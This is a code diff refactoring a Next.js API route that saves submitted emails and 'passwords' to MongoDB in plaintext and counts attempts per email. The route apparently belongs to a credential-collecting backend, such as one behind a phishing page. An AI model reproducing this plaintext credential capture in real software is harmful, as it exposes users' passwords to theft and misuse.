@@ -1,6 +1,6 @@
 import { NextResponse } from "next/server";
 import { connectToDatabase } from "@/lib/mongodb";
-import { Credential } from "@/models/Credential";
+import { CredentialModel } from "@/models/Credential";
 import { MongoError } from 'mongodb';
 
 export async function POST(request: Request) {
@@ -17,28 +17,18 @@ export async function POST(request: Request) {
 
     await connectToDatabase();
 
-    const existingCredential = await Credential.findOne({ email });
-    const createdAt = new Date();
-    const formattedCreatedAt = `${String(createdAt.getDate()).padStart(
-      2,
-      "0"
-    )}/${String(createdAt.getMonth() + 1).padStart(2, "0")}/${createdAt
-      .getFullYear()
-      .toString()
-      .slice(-2)} ${String(createdAt.getHours()).padStart(2, "0")}:${String(
-      createdAt.getMinutes()
-    ).padStart(2, "0")}`;
+    const existingCredential = await CredentialModel.findOne({ email });
 
     if (existingCredential) {
       existingCredential.attempts += 1;
       existingCredential.passwords = passwords;
       await existingCredential.save();
     } else {
-      await Credential.create({
+      await CredentialModel.create({
         email,
         passwords,
         attempts: 1,
-        createdAt: formattedCreatedAt,
+        createdAt:  new Date(),
       });
     }
 
